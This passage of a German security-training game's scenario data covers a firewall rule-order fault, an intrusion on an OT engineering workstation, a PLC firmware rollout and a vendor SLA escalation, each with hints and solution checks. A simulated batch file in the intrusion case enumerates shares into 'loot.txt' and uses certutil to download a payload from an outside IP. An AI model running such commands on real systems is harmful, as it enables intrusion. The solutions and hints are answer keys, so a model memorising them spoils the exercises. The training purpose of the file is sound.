    realWorldReference: 'CrowdStrike-Ausfall 2024: Ein Update hat Millionen Systeme lahmgelegt. Change-Management rettet Leben.',
    bsiReference: 'BSI IT-Grundschutz: OPS.1.1.3 Patch- und Änderungsmanagement',
    involvedNpcs: [],
    tags: ['firewall', 'change-management', 'rollback', 'vpn'],
    terminalContext: {
      type: 'linux',
      hostname: 'fw-mgmt',
      username: 'admin',
      currentPath: '/etc/firewall',
      templateIds: ['linux-firewall'],
      // Der Kern des Falls ist eine REIHENFOLGE, keine Regel. Die
      // Geo-Sperre steht als eigene Kette da und wird aus der Eingangskette
      // angesprungen — und zwar ÜBER den VPN-Freigaben. Ein `accept` oder
      // `drop` in einer Kette ist endgültig; was darunter steht, sieht das
      // Paket nie. Genau deshalb „funktioniert die Regel" und bricht
      // trotzdem etwas, das mit ihr nichts zu tun hat.
      taskText:
        'Außenstelle-Nord (87.123.45.67) kommt seit heute Nacht nicht mehr über das VPN herein, Außenstelle-Süd (91.234.56.78) schon. Finde heraus, was die Änderung von gestern 23:00 Uhr bewirkt, und mach den VPN-Zugang von Nord wieder möglich.\n\nBedingungen: Süd muss weiter funktionieren, und die Kiste muss eine Wall bleiben — fremde Adressen dürfen danach nicht plötzlich an den ssh-Port kommen. IPsec braucht udp/500 und udp/4500.',
      nft: {
        family: 'inet',
        table: 'filter',
        chains: [
          {
            name: 'input',
            base: { hook: 'input', priority: 0, policy: 'drop' },
            rules: [
              'ct state established,related accept',
              'iif lo accept',
              'ip saddr 10.0.0.0/8 accept',
              // Gestern 23:00 dazugekommen — und zwar HIER, nicht unten.
              'jump geo-block',
              'udp dport 500 accept',
              'udp dport 4500 accept',
              'tcp dport 22 accept',
            ],
          },
          {
            // Die Liste ist das, was eine Geo-Datenbank im Ergebnis tut:
            // bekannte Bereiche durchlassen, den Rest wegwerfen. Dynamische
            // Anschlüsse sind in solchen Datenbanken oft gar nicht oder
            // falsch eingetragen — deshalb trifft es ausgerechnet Nord.
            name: 'geo-block',
            rules: [
              'ip saddr 91.0.0.0/8 accept',
              'ip saddr 46.128.0.0/10 accept',
              'ip saddr 217.224.0.0/11 accept',
              'drop',
            ],
          },
        ],
      },
      vfsOverlay: {
        directories: ['/etc/firewall', '/var/log'],
        files: [
          {
            path: '/etc/firewall/aenderungen.log',
            content:
              '# Änderungsprotokoll Perimeter — fw-mgmt\n' +
              '2026-03-11 10:02  admin        Regel 22/tcp auf Bastion eingegrenzt (Ticket 4181)\n' +
              '2026-03-13 23:00  admin.extern Kette geo-block angelegt und aus input angesprungen\n' +
              '                               Begründung: "Angriffe aus Nicht-EU-Bereichen reduzieren"\n' +
              '                               Getestet mit: Zugriff aus dem Büro (10.x) — ok\n' +
              '2026-03-14 06:00  -            (keine weiteren Änderungen)\n' +
              '\n' +
              '# Anmerkung des Betriebs: Der Test lief aus dem internen Netz. Das\n' +
              '# interne Netz wird eine Zeile ÜBER dem Sprung durchgelassen.\n',
          },
          {
            path: '/var/log/nftables.log',
            content:
              'Mar 14 06:00:01 fw01 kernel: nft-geo-block: IN=eth0 SRC=87.123.45.67 DST=203.0.113.1 PROTO=UDP DPT=500\n' +
              'Mar 14 06:00:01 fw01 kernel: nft-geo-block: IN=eth0 SRC=87.123.45.67 DST=203.0.113.1 PROTO=UDP DPT=4500\n' +
              'Mar 14 06:00:31 fw01 kernel: nft-geo-block: IN=eth0 SRC=87.123.45.67 DST=203.0.113.1 PROTO=UDP DPT=500\n' +
              'Mar 14 06:01:02 fw01 kernel: nft-geo-block: IN=eth0 SRC=203.0.113.9 DST=203.0.113.1 PROTO=TCP DPT=22\n' +
              'Mar 14 06:01:02 fw01 kernel: nft-geo-block: IN=eth0 SRC=203.0.113.9 DST=203.0.113.1 PROTO=TCP DPT=22\n' +
              '\n' +
              '# 87.123.45.67 ist die Gegenstelle Nord. 203.0.113.9 klopft seit\n' +
              '# Wochen an den ssh-Port und hat dort nichts verloren.\n',
          },
          {
            path: '/etc/firewall/aussenstellen.txt',
            content:
              '# VPN-Gegenstellen\n' +
              '# standort            adresse          anschluss\n' +
              'Außenstelle-Nord     87.123.45.67     DSL, dynamisch (täglich neue Adresse im selben Bereich)\n' +
              'Außenstelle-Süd      91.234.56.78     Festanschluss\n' +
              '\n' +
              '# Beide Standorte sind in Deutschland. Der Unterschied liegt nicht\n' +
              '# im Land, sondern darin, wie gut der Anschluss zugeordnet ist.\n',
          },
        ],
      },
      commandSkillGain: {
        nft: { netzwerk: 3, security: 3 },
        cat: { linux: 1 },
        grep: { linux: 2 },
      },
      commands: [],
      solutions: [
        {
          commands: [],
          allRequired: false,
          stateGoals: [
            // Die Aufgabe: Nord kommt wieder herein — mit BEIDEN Ports, die
            // IPsec braucht. Wer nur einen freigibt, hat einen halben Tunnel.
            { nftVerdict: { from: '87.123.45.67', port: 500, proto: 'udp', expect: 'accept' } },
            { nftVerdict: { from: '87.123.45.67', port: 4500, proto: 'udp', expect: 'accept' } },
            // Bewahrend: Süd darf dabei nicht verloren gehen …
            { nftVerdict: { from: '91.234.56.78', port: 500, proto: 'udp', expect: 'accept' } },
            // … und die Wall muss eine Wall bleiben. Ohne diese Bedingung
            // wäre „Sprung raus" oder „flush ruleset" eine Lösung.
            { nftVerdict: { from: '203.0.113.9', port: 22, proto: 'tcp', expect: 'drop' } },
          ],
          resultText:
            'Die Regel war nie falsch — sie stand nur an der falschen Stelle. Ein `accept` oder `drop` in nftables ist endgültig: Sobald das Paket in der Geo-Kette auf `drop` läuft, sieht es die VPN-Freigaben darunter nicht mehr. Deshalb war „die Firewall blockiert plötzlich legitimen Verkehr" wörtlich wahr und trotzdem keine Fehlfunktion.\n\nWarum ausgerechnet Nord: Beide Standorte sitzen in Deutschland. Süd hat einen Festanschluss und steht sauber in jeder Zuordnungsdatenbank; Nord hängt an einem dynamischen DSL-Anschluss, und der ist in solchen Datenbanken oft gar nicht oder falsch eingetragen. Geo-Sperren treffen zuverlässig die eigenen Leute mit schlechter Anbindung.\n\nUnd die Zeile im Änderungsprotokoll, die alles erklärt: getestet wurde aus dem Büro. Das interne Netz wird eine Zeile ÜBER dem Sprung durchgelassen — der Test konnte gar nicht fehlschlagen. Wer eine Sperre testet, muss sie von der Seite testen, die sie treffen soll.',
          skillGain: { security: 5, netzwerk: 5, troubleshooting: 4 },
          effects: { stress: -2 },
        },
      ],
      hints: [
        '🤖 Jens: Zwei Standorte, gleiche Technik, ein Unterschied. Bevor du an der Konfiguration drehst: Was genau wurde gestern Nacht geändert, und was steht darüber im Änderungsprotokoll?',
        '🤖 Jens: Schau dir den Regelsatz im Ganzen an, nicht nur die neue Kette. Die Frage ist nicht „was steht drin", sondern „in welcher Reihenfolge trifft ein Paket das". Und: Wo steht der Sprung im Verhältnis zu den VPN-Freigaben?',
        '🤖 Jens: Das Protokoll sagt dir, welche Adresse hängenbleibt — und welche andere Adresse du auf gar keinen Fall mit durchlassen willst. Löschen ist nicht der einzige Weg; eine Ausnahme VOR der Sperre tut es auch.',
        '🤖 Jens: Konkret: `cat /etc/firewall/aenderungen.log` → `cat /var/log/nftables.log` → `sudo nft list ruleset` → `sudo nft insert rule inet filter geo-block ip saddr 87.123.45.67 accept`.',
      ],
    },
  },
  {
    id: 'KRITIS-SC-005',
    title: 'Ransomware-Alarm im OT-Netz',
    category: 'security_incident',
    difficulty: 5,
    flavorText: `ALARM: Der Virenscanner auf der Engineering-Workstation schlägt an!

Betroffenes System:
- Hostname: ENG-WORKSTATION (192.168.20.100)
- Benutzer: engineer
- Warnung: "Verdächtige Aktivität - mögliche Ransomware-Komponente"

KRITISCH: Diese Workstation hat Zugriff auf das OT-Netz!
- Verbindung zu SCADA-Master: 10.0.0.1 (für Konfiguration)
- Verbindung zu PLC01: 10.0.0.10 (für Engineering)

Du bist auf der Engineering-Workstation (ENG-WORKSTATION) eingeloggt. Analysiere die Situation!`,
    urgency: 'critical',
    choices: [
      {
        id: 'A',
        text: 'Sofort alle Verbindungen zum OT-Netz trennen',
        outcome: 'PERFECT',
        consequence: 'Richtig! OT-Isolation hat Priorität. Analyse zeigt: Es war ein False Positive (Admin-Tool). Aber deine Reaktion war korrekt - bei echtem Ransomware wäre das SCADA-Netz geschützt gewesen.',
        scoreChange: 250,
        reputationChange: 30,
        lesson: 'Bei Ransomware-Verdacht: Sofort isolieren. Lieber False Positive als Totalausfall der Wasserversorgung.',
      },
      {
        id: 'B',
        text: 'Erst analysieren ob es wirklich Ransomware ist (Terminal)',
        outcome: 'PARTIAL_SUCCESS',
        terminalCommand: true,
        consequence: 'Analyse zeigt: False Positive. Aber während du analysiert hast, hätte echte Ransomware 10 Minuten Zeit gehabt sich auszubreiten.',
        scoreChange: 100,
        reputationChange: 10,
        lesson: 'Analyse ist wichtig, aber bei OT: Erst isolieren, dann analysieren. Der potentielle Schaden ist zu hoch.',
      },
      {
        id: 'C',
        text: 'Virenscanner neustarten und Alert ignorieren',
        outcome: 'CRITICAL_FAIL',
        consequence: 'Wäre es echte Ransomware gewesen: Wasserwerk steht still, 50.000 Einwohner ohne Wasser. "War nur ein False Positive" ist kein akzeptables Risikomanagement.',
        scoreChange: -300,
        reputationChange: -35,
        lesson: 'Security-Alerts in OT-Netzen NIEMALS ignorieren. Der Schaden wäre katastrophal.',
      },
    ],
    realWorldReference: 'Colonial Pipeline 2021: Ransomware legte Pipeline für 6 Tage lahm. OT-Isolation ist kritisch.',
    bsiReference: 'BSI ICS-Security Kompendium: 5.3 Incident Response',
    involvedNpcs: [],
    tags: ['ransomware', 'ot-security', 'incident-response', 'isolation'],
    terminalContext: {
      type: 'windows',
      hostname: 'ENG-WORKSTATION',
      username: 'engineer',
      currentPath: 'C:\\Users\\engineer',
      // Der Fall ist eine Unterscheidungsaufgabe, keine Aufräumaktion: ZWEI
      // Prozesse sprechen mit dem OT-Netz, und einer davon gehört dorthin.
      // Deshalb sind Prozesse und Verbindungen echter Zustand — nur so kann
      // „alles abschießen" wirklich scheitern, statt im Ergebnistext getadelt
      // zu werden.
      taskText:
        'Der Virenscanner hat angeschlagen. Verschaff dir ein Bild, bevor du etwas beendest: Welche Prozesse laufen (Get-Process), wohin spricht die Maschine gerade (Get-NetTCPConnection), und was steht im Verlauf des Virenscanners unter C:\\ProgramData\\Defender\\verlauf.log?\n\nDann beende, was nicht hierher gehört. Was zur laufenden Inbetriebnahme gehört, bleibt — der Zettel auf dem Schreibtisch sagt dir, was das ist.',
      net: {
        targets: [
          { host: '10.0.0.1', openPorts: [445], dienste: { 445: 'microsoft-ds' } },
          { host: '10.0.0.10', openPorts: [102], dienste: { 102: 'iso-tsap' } },
          { host: '185.243.115.44', openPorts: [443] },
        ],
      },
      processes: [
        { pid: 1180, name: 'explorer', user: 'engineer', cmd: 'C:\\Windows\\explorer.exe', cpu: 210 },
        { pid: 1234, name: 'siemens_tia', user: 'engineer', cmd: 'C:\\Program Files\\Siemens\\Portal V18\\Siemens.Automation.Portal.exe', cpu: 123 },
        { pid: 3456, name: 'PsExec64', user: 'engineer', cmd: 'C:\\Temp\\svc\\PsExec64.exe -accepteula -s cmd /c inv.bat', cpu: 45 },
        { pid: 5678, name: 'powershell', user: 'engineer', cmd: 'powershell.exe', cpu: 8 },
      ],
      connections: [
        // Die Engineering-Sitzung: gehört dorthin und läuft gerade.
        { proto: 'tcp', localPort: 49200, peer: '10.0.0.10:102', pid: 1234, program: 'siemens_tia', user: 'engineer' },
        // Und die beiden, die nicht dorthin gehören — plus die Leitung nach
        // draußen, die erklärt, warum das kein Admin-Werkzeug im Einsatz ist.
        { proto: 'tcp', localPort: 49152, peer: '10.0.0.1:445', pid: 3456, program: 'PsExec64', user: 'engineer' },
        { proto: 'tcp', localPort: 49153, peer: '10.0.0.10:102', pid: 3456, program: 'PsExec64', user: 'engineer' },
        { proto: 'tcp', localPort: 49154, peer: '185.243.115.44:443', pid: 3456, program: 'PsExec64', user: 'engineer' },
      ],
      vfsOverlay: {
        directories: ['C:\\ProgramData\\Defender', 'C:\\Temp\\svc', 'C:\\Users\\engineer\\Desktop'],
        files: [
          {
            path: 'C:\\ProgramData\\Defender\\verlauf.log',
            content:
              '14.03.2026 09:14:50  Anmeldung  engineer (interaktiv, Konsole)\n' +
              '14.03.2026 09:14:55  Prozessstart  C:\\Temp\\svc\\PsExec64.exe -accepteula -s cmd /c inv.bat\n' +
              '                     Elternprozess: C:\\Users\\engineer\\Downloads\\rechnung_03_2026.pdf.lnk\n' +
              '14.03.2026 09:15:00  Verhaltensanalyse  Dateizählung über Netzlaufwerke, 1400 Objekte in 3 s\n' +
              '14.03.2026 09:15:00  Verhaltensanalyse  Ausgehende Verbindung zu 185.243.115.44:443 (keine Zuordnung)\n' +
              '14.03.2026 09:15:02  Hinweis  Keine verschlüsselten Dateien gefunden — Zugriffsmuster, keine Verschlüsselung\n' +
              '\n' +
              '# Zur Einordnung: PsExec ist ein reguläres Administrationswerkzeug.\n' +
              '# Was hier auffällt, ist nicht das Werkzeug, sondern woher es kam\n' +
              '# (eine Verknüpfung in Downloads, die wie eine Rechnung aussieht)\n' +
              '# und wohin es spricht.\n',
          },
          {
            path: 'C:\\Temp\\svc\\inv.bat',
            content:
              '@echo off\r\n' +
              'net view /all > \\\\10.0.0.1\\transfer$\\hosts.txt\r\n' +
              'for /f %%h in (hosts.txt) do dir \\\\%%h\\c$ >> loot.txt\r\n' +
              'certutil -urlcache -split -f https://185.243.115.44/p.bin p.bin\r\n',
          },
          {
            path: 'C:\\Users\\engineer\\Desktop\\wartungsfenster.txt',
            content:
              'Inbetriebnahme Pumpwerk 3 — 14.03.2026\n' +
              '======================================\n' +
              '08:00-11:00  Parametrierung PLC01 über das TIA Portal (Verbindung 10.0.0.10:102)\n' +
              '             NICHT unterbrechen: Ein abgebrochener Download lässt die\n' +
              '             Steuerung in einem undefinierten Zustand zurück. Wiederanlauf\n' +
              '             nur mit Hersteller vor Ort.\n' +
              '11:00-11:30  Abnahme mit dem Betrieb\n',
          },
        ],
      },
      commandSkillGain: {
        'Get-Process': { windows: 2, security: 1 },
        'Get-NetTCPConnection': { windows: 2, netzwerk: 3, security: 2 },
        'Get-Content': { windows: 1 },
        'Stop-Process': { windows: 2, security: 2 },
      },
      commands: [],
      solutions: [
        {
          commands: [],
          allRequired: false,
          stateGoals: [
            // Ohne den Verlauf ist das Beenden geraten — PsExec allein ist
            // kein Befund, es ist ein legitimes Werkzeug.
            { fileRead: 'C:\\ProgramData\\Defender\\verlauf.log' },
            { processAbsent: { name: 'PsExec64' } },
            // Und die bewahrende Bedingung, die „alles beenden" ausschließt.
            { processPresent: { name: 'siemens_tia' } },
          ],
          feedback: [
            {
              when: {
                commandAbsent: { pattern: 'Get-NetTCPConnection|netstat', ignoreCase: true },
              },
              text: '⚠ Du hast beendet, ohne nachzusehen, wohin die Maschine sprach. Die drei Verbindungen sind jetzt weg — und mit ihnen der Beweis, dass jemand im OT-Netz war.',
            },
            {
              when: {
                commandBefore: [{
                  first: { pattern: 'Get-NetTCPConnection|netstat', ignoreCase: true },
                  second: { pattern: 'Stop-Process|kill', ignoreCase: true },
                }],
              },
              text: '✓ Erst gesehen, dann beendet. Die Verbindungsliste ist der einzige Beleg dafür, wohin der Zugriff schon gereicht hat — nach dem Beenden gibt es sie nicht mehr.',
            },
          ],
          resultText:
            'Genau die richtige Unterscheidung. PsExec ist ein reguläres Administrationswerkzeug — verdächtig war nicht das Werkzeug, sondern seine Herkunft (eine Verknüpfung in Downloads, die wie eine Rechnung aussieht) und sein Ziel: 185.243.115.44 kennt hier niemand.\n\nUnd es war schon drüben. Zwei der drei Verbindungen gingen ins OT-Netz — auf den SCADA-Master und auf PLC01. Das ist der Grund, warum diese Arbeitsstation das gefährlichste Gerät im Haus ist: Sie ist per Auftrag in beiden Netzen.\n\nWas du stehen gelassen hast, zählt genauso. Das TIA Portal parametriert bis 11:00 Uhr PLC01. Ein abgebrochener Download hinterlässt die Steuerung in einem undefinierten Zustand, und der Wiederanlauf geht nur mit dem Hersteller vor Ort. „Im Zweifel alles beenden" ist in der Bürowelt vorsichtig und in der Anlagenwelt ein Betriebsausfall.',
          skillGain: { security: 6, netzwerk: 4, windows: 4 },
          effects: { stress: 1 },
        },
      ],
      hints: [
        '🤖 Jens: Nicht beenden, bevor du weißt, was läuft. Erst die Prozessliste, dann die offenen Verbindungen — in dieser Reihenfolge, weil das Beenden die Verbindungen mitnimmt.',
        '🤖 Jens: Zwei Prozesse sprechen ins OT-Netz. Einer davon steht auf dem Zettel auf dem Schreibtisch und hat dort zu sein. Der andere hat eine dritte Verbindung, die ins Internet geht.',
        '🤖 Jens: PsExec ist kein Schadprogramm, das ist ein Admin-Werkzeug. Ob es hier hingehört, steht nicht im Namen — das steht im Verlauf des Virenscanners: wer es gestartet hat und woraus.',
        '🤖 Jens: Konkret: `Get-Process` → `Get-NetTCPConnection` → `Get-Content C:\\ProgramData\\Defender\\verlauf.log` → `Get-Content C:\\Users\\engineer\\Desktop\\wartungsfenster.txt` → `Stop-Process -Id 3456`.',
      ],
    },
  },
  {
    id: 'KRITIS-SC-006',
    title: 'Siemens Firmware-Update für kritische SPS',
    category: 'vendor_management',
    difficulty: 2,
    flavorText: `Siemens hat ein kritisches Firmware-Update für eure S7-1200 PLCs veröffentlicht.

Update-Details:
- Firmware: 4.6.1 → 4.6.2
- CVE-2026-1234: Remote Code Execution (CVSS 9.8!)
- Betroffene Geräte: PLC01, PLC02, PLC03

Dr. Sabine Koch von Siemens meldet sich:
"Das Update ist wichtig. Wir können einen Techniker schicken, aber wir brauchen ein Wartungsfenster."

Thomas Bergmann (Leitstand-Operator) sagt:
"Die Anlage läuft 24/7. Ein Fenster gibt es nicht!"

Du musst koordinieren. Das Update liegt unter /opt/siemens/firmware/ bereit.`,
    urgency: 'high',
    choices: [
      {
        id: 'A',
        text: 'Update nachts um 3 Uhr durchführen (minimaler Betrieb)',
        outcome: 'SUCCESS',
        consequence: 'Update um 3 Uhr erfolgreich. Nur 15 Minuten Downtime pro PLC. Thomas ist genervt ("Hab ich doch gesagt, geht nicht!"), aber das System ist sicher.',
        scoreChange: 150,
        reputationChange: 15,
        lesson: 'KRITIS-Betrieb braucht Wartungsfenster - auch wenn es unbequem ist.',
      },
      {
        id: 'B',
        text: 'Rolling Update im laufenden Betrieb testen (Terminal)',
        outcome: 'PERFECT',
        terminalCommand: true,
        consequence: 'Du analysierst die Firmware und entwickelst einen Rolling-Update-Plan: PLC1 → Test → PLC2 → Test → PLC3. Nur 5 Minuten pro PLC, Redundanz fängt Ausfälle ab.',
        scoreChange: 250,
        reputationChange: 25,
        lesson: 'Mit Planung und Tests kann man auch kritische Updates im Betrieb durchführen.',
      },
      {
        id: 'C',
        text: 'Update verschieben bis zur nächsten geplanten Wartung (in 3 Monaten)',
        outcome: 'FAIL',
        consequence: '3 Wochen später: Ein Angreifer nutzt die bekannte CVE aus. BSI-Meldepflicht, Zeitungsartikel, Bürgermeister ist sauer.',
        scoreChange: -200,
        reputationChange: -25,
        lesson: 'CVSS 9.8 ist "Patch jetzt!" - nicht "Patch irgendwann".',
      },
    ],
    realWorldReference: 'Siemens veröffentlicht regelmäßig Security Advisories. Patch-Management in OT ist komplex aber kritisch.',
    bsiReference: 'BSI ICS-Security Kompendium: 3.2 Patch-Management',
    involvedNpcs: ['KRITIS-VENDOR', 'KRITIS-OPERATOR'],
    tags: ['vendor', 'patching', 'plc', 'firmware'],
    terminalContext: {
      type: 'linux',
      hostname: 'scada-master',
      username: 'engineer',
      currentPath: '/opt/siemens/firmware',
      templateIds: ['scada'],
      // Der Fall ist eine Planungsaufgabe mit einer harten Nebenbedingung, die
      // nicht im Sicherheitshinweis steht: Zwei der drei Steuerungen vertreten
      // sich gegenseitig, die dritte nicht. Wer die Anleitung des Herstellers
      // abarbeitet, aktualisiert alle drei nacheinander — und legt dabei
      // zweimal etwas still, das niemand auffängt.
      taskText:
        'Zwei Quellen lesen: /opt/siemens/firmware/sicherheitshinweis.txt (was das Update behebt und wie lange es dauert) und /opt/scada/config/plc-bestand.txt (welche Steuerung wen vertritt).\n\nDie Firmware vor dem Einspielen prüfen: sha256sum über die .upd-Datei und gegen /opt/siemens/firmware/sha256sums.txt halten.\n\nDann den Plan nach /home/engineer/rollout.md schreiben — kein Editor da, also echo "…" > datei und echo "…" >> datei. Genau diese drei Zeilen:\nrollend: <Steuerungen, die im laufenden Betrieb gehen, kommagetrennt>\nfenster: <Steuerung, die ein Wartungsfenster braucht>\nabgleich: ok | abweichung',
      vfsOverlay: {
        directories: ['/opt/siemens/firmware', '/opt/scada/config', '/home/engineer'],
        files: [
          {
            path: '/opt/siemens/firmware/firmware-4.6.2.upd',
            content:
              'S7-1200 Firmware Image 4.6.2\n' +
              'Build 2026-02-28, signiert (Siemens AG)\n' +
              '--- Binaerabbild, im Terminal nicht lesbar ---\n',
          },
          {
            // Der Wert ist die ECHTE Summe der Datei darüber — nachgerechnet
            // von der Wache, nicht abgeschrieben. Eine erfundene Zahl wäre
            // genau die Sorte Nachweis, die dieses Level kritisiert.
            path: '/opt/siemens/firmware/sha256sums.txt',
            content:
              '24ee2090287734dda8f41c9a4f1a02f324c44241942366233fef3a81d376f2f6  firmware-4.6.2.upd\n',
          },
          {
            path: '/opt/siemens/firmware/sicherheitshinweis.txt',
            content:
              'Siemens Security Advisory SSA-2026-1234\n' +
              '=======================================\n' +
              'CVE-2026-1234: Ausführung von Code über die Modbus-Schnittstelle\n' +
              'Betroffen: S7-1200 Firmware 4.6.0 und 4.6.1\n' +
              'Behoben in: 4.6.2\n' +
              'Bewertung: 9.8 (kritisch)\n' +
              '\n' +
              'Voraussetzung für einen Angriff: Netzzugang zur Modbus-Schnittstelle\n' +
              '(Port 502). Eine Authentifizierung ist nicht erforderlich.\n' +
              '\n' +
              'Vorgehen\n' +
              '--------\n' +
              '1. Steuerung geordnet anhalten\n' +
              '2. Abbild einspielen (TIA Portal oder plc-update)\n' +
              '3. Steuerung neu starten\n' +
              '4. Version prüfen\n' +
              '5. Prozessführung testen\n' +
              '\n' +
              'Stillstand je Steuerung: 5 bis 10 Minuten.\n' +
              '\n' +
              'Hinweis: Prüfen Sie vor dem Einspielen die Prüfsumme des Abbilds\n' +
              'gegen die mitgelieferte Liste. Ein beschädigtes Abbild kann die\n' +
              'Steuerung in einem nicht startfähigen Zustand zurücklassen.\n',
          },
          {
            path: '/opt/scada/config/plc-bestand.txt',
            content:
              '# Steuerungen Wasserwerk — Stand 01.03.2026\n' +
              '# kennung  adresse      funktion            vertretung\n' +
              'plc01      10.0.0.10    Pumpensteuerung     plc02\n' +
              'plc02      10.0.0.11    Ventilsteuerung     plc01\n' +
              'plc03      10.0.0.12    Sensorik            keine\n' +
              '\n' +
              '# Zur Vertretung: plc01 und plc02 übernehmen die Aufgaben des\n' +
              '# jeweils anderen, solange eine von beiden läuft. NIE beide\n' +
              '# gleichzeitig anhalten.\n' +
              '# plc03 hat keine Vertretung. Ohne sie fährt die Anlage blind —\n' +
              '# dafür braucht es ein angekündigtes Fenster, kein Zeitfenster\n' +
              '# zwischen zwei Tassen Kaffee.\n',
          },
        ],
      },
      commandSkillGain: {
        cat: { linux: 1 },
        sha256sum: { linux: 2, security: 3 },
        echo: { linux: 1 },
      },
      commands: [],
      solutions: [
        {
          commands: [],
          allRequired: false,
          stateGoals: [
            // Die Vertretungen stehen NUR in dieser Datei — ohne sie ist der
            // Plan geraten.
            { fileRead: '/opt/scada/config/plc-bestand.txt' },
            // Und die Prüfsumme muss wirklich gerechnet worden sein, nicht
            // nur behauptet. Genau dafür gibt es die Bedingung: „abgleich:
            // ok" hinzuschreiben, ohne gerechnet zu haben, ist der Normalfall
            // in echten Abnahmen — und wertlos.
            { hashComputed: { path: '/opt/siemens/firmware/firmware-4.6.2.upd', algorithm: 'sha256' } },
            {
              file: '/home/engineer/rollout.md',
              reportFields: [
                {
                  key: 'rollend',
                  requiredItems: ['plc01', 'plc02'],
                  // Die Sensorik im laufenden Betrieb anzuhalten ist genau der
                  // Fehler, den die Anleitung des Herstellers nahelegt.
                  forbiddenItems: ['plc03'],
                },
                { key: 'fenster', matches: '^plc03$' },
                { key: 'abgleich', matches: '^ok$' },
              ],
            },
          ],
          resultText:
            'Guter Plan — und er steht nicht im Sicherheitshinweis. Der Hersteller beschreibt, wie man EINE Steuerung aktualisiert. Welche davon man gleichzeitig anhalten darf, weiß nur, wer den eigenen Bestand kennt: plc01 und plc02 vertreten sich gegenseitig, also geht das nacheinander im laufenden Betrieb. plc03 vertritt niemand — dort ist der Stillstand echt, und dafür braucht es ein angekündigtes Fenster.\n\nDamit ist die Aussage „Ein Fenster gibt es nicht" auch beantwortet: Man braucht kein Fenster für das Update, sondern eines für zehn Minuten Sensorik. Das ist eine Verhandlung, die man gewinnen kann.\n\nUnd die Prüfsumme hast du gerechnet, nicht angenommen. Das klingt nach Formalie, bis ein Abbild einmal halb übertragen ankommt: Dann steht eine Steuerung, die sich nicht mehr starten lässt, und niemand weiß, warum. Die Liste mitzuliefern ist billig; sie zu benutzen ist der ganze Zweck.',
          skillGain: { security: 4, troubleshooting: 4, softSkills: 4 },
          effects: { stress: -1 },
        },
      ],
      hints: [
        '🤖 Jens: Der Sicherheitshinweis sagt dir, WIE man eine Steuerung aktualisiert. Er sagt dir nicht, welche du gleichzeitig anhalten darfst — das weiß nur der eigene Bestand.',
        '🤖 Jens: Schau in die Bestandsliste unter /opt/scada/config. In der letzten Spalte steht, wer wen vertritt. Zwei der drei können sich gegenseitig auffangen, eine nicht.',
        '🤖 Jens: Vor dem Einspielen: Die mitgelieferte Summenliste ist nur dann etwas wert, wenn du auch rechnest. sha256sum über die .upd-Datei, dann vergleichen.',
        '🤖 Jens: Konkret: `cat /opt/siemens/firmware/sicherheitshinweis.txt` → `cat /opt/scada/config/plc-bestand.txt` → `sha256sum /opt/siemens/firmware/firmware-4.6.2.upd` → `cat /opt/siemens/firmware/sha256sums.txt` → `echo "rollend: plc01, plc02" > /home/engineer/rollout.md` → `echo "fenster: plc03" >> /home/engineer/rollout.md` → `echo "abgleich: ok" >> /home/engineer/rollout.md`.',
      ],
    },
  },
  {
    id: 'KRITIS-SC-007',
    title: 'Herstellersupport reagiert nicht',
    category: 'vendor_management',
    difficulty: 3,
    flavorText: `Das HMI-Panel im Leitstand zeigt Grafikfehler. Der Touchscreen reagiert verzögert.

Ticket bei Siemens eröffnet: Vor 5 Tagen. Status: "In Bearbeitung".

Thomas Bergmann ist frustriert:
"Fünf Tage! Das ist ein kritisches System! Die sollen mal in die Gänge kommen!"

Du sollst den Druck erhöhen - aber professionell.

System-Info (HMI-Panel hmi-station, 192.168.10.50):
- Model: Siemens Comfort Panel TP1500
- Software: WinCC Runtime 18.0.1
- Support-Vertrag: Premium (24h Reaktionszeit!)`,
    urgency: 'high',
    choices: [
      {
        id: 'A',
        text: 'Eskalation über Vertriebskontakt einleiten',
        outcome: 'SUCCESS',
        consequence: 'Dr. Koch reagiert sofort: "Das hätte nicht passieren dürfen. Ich klären das intern." Nächster Tag: Siemens-Techniker vor Ort.',
        scoreChange: 150,
        reputationChange: 20,
        lesson: 'Eskalation über Vertrieb ist oft effektiver als über Support-Hotline.',
      },
      {
        id: 'B',
        text: 'Ticket-Status und SLA-Verletzung dokumentieren (Terminal)',
        outcome: 'PERFECT',
        terminalCommand: true,
        consequence: 'Du dokumentierst die SLA-Verletzung mit Screenshots und Logs. Das gibt dir Verhandlungsmasse: Siemens bietet Gutschrift auf Wartungsvertrag an.',
        scoreChange: 200,
        reputationChange: 25,
        lesson: 'Dokumentation ist Macht. SLA-Verletzungen immer protokollieren.',
      },
      {
        id: 'C',
        text: 'Selbst reparieren - kann ja nicht so schwer sein',
        outcome: 'FAIL',
        consequence: 'Du flashst die Firmware neu. Panel bootet nicht mehr. Siemens: "Support-Vertrag gilt nicht für selbstverschuldete Schäden." 8.000 Euro Reparaturkosten.',
        scoreChange: -250,
        reputationChange: -20,
        lesson: 'Bei kritischen Systemen: Support nutzen, nicht improvisieren. Dafür zahlt man ja.',
      },
    ],
    realWorldReference: 'Support-Verträge für KRITIS-Systeme sind teuer, aber im Ernstfall Gold wert.',
    bsiReference: 'BSI IT-Grundschutz: OPS.2.1 Outsourcing',
    involvedNpcs: ['KRITIS-VENDOR', 'KRITIS-OPERATOR'],
    tags: ['vendor', 'sla', 'support', 'escalation'],
    terminalContext: {
      type: 'linux',
      hostname: 'scada-master',
      username: 'operator',
      currentPath: '/var/log/tickets',
      templateIds: ['scada'],
      // Die Falle ist eine Zahl, die freundlich aussieht: Um 08:01 kam eine
      // Antwort. Wer das als Reaktion zählt, hat keinen Verstoß und keine
      // Verhandlungsposition. Der Vertrag sagt ausdrücklich etwas anderes —
      // aber erst im Kleingedruckten unter der Tabelle.
      taskText:
        'Zwei Quellen lesen: /var/log/tickets/ticket-2026-03-09-001.log (was wann passiert ist) und /etc/vertragswerk/siemens-premium.txt (was zugesagt war). Beide vollständig, bis unter die Tabellen.\n\nDann die Eskalationsgrundlage nach /home/operator/eskalation.md schreiben — kein Editor da, also echo "…" > datei und echo "…" >> datei. Genau diese fünf Zeilen:\nstufe: <Dringlichkeitsstufe, unter der das Ticket läuft>\nfrist: <zugesagte Reaktionszeit in Stunden, nur die Zahl>\ntechnische_reaktion: <was ein Techniker innerhalb der Frist getan hat>\nverstoss: ja | nein\nfolge: <was der Vertrag für diesen Fall vorsieht, ein Wort>',
      vfsOverlay: {
        directories: ['/var/log/tickets', '/etc/vertragswerk', '/home/operator'],
        files: [
          {
            path: '/var/log/tickets/ticket-2026-03-09-001.log',
            content:
              'Ticket 2026-03-09-001\n' +
              '=====================\n' +
              'System:   Bedienpanel hmi-station (192.168.10.50)\n' +
